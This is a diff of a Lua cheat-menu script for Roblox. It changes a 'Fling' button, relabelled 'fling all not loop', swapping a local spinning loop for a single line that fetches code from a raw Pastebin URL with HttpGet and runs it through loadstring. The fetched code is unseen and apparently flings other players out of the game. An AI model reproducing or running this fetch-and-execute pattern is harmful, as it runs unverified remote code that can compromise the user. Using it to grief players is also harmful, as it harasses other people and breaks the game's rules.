@@ -93,24 +93,8 @@ end
  local Section = Tab:CreateSection("Fling")
 
  local Button = Tab:CreateButton({
-    Name = "fling work in progress",
+    Name = "fling all not loop",
     Callback = function()
-        local player = game.Players.LocalPlayer
-        local character = player.Character or player.CharacterAdded:Wait()
-        local humanoid = character:WaitForChild("Humanoid")
-        
-        local speed = 1000 -- Adjust the speed of the spin
-        
-        local function spinCharacter()
-            while true do
-                for angle = 0, 360, speed do
-                    character:SetPrimaryPartCFrame(character.PrimaryPart.CFrame * CFrame.Angles(0, math.rad(speed), 0))
-                    wait()
-                end
-            end
-        end
-        
-        spinCharacter()
-        
+        loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
     end,
  })
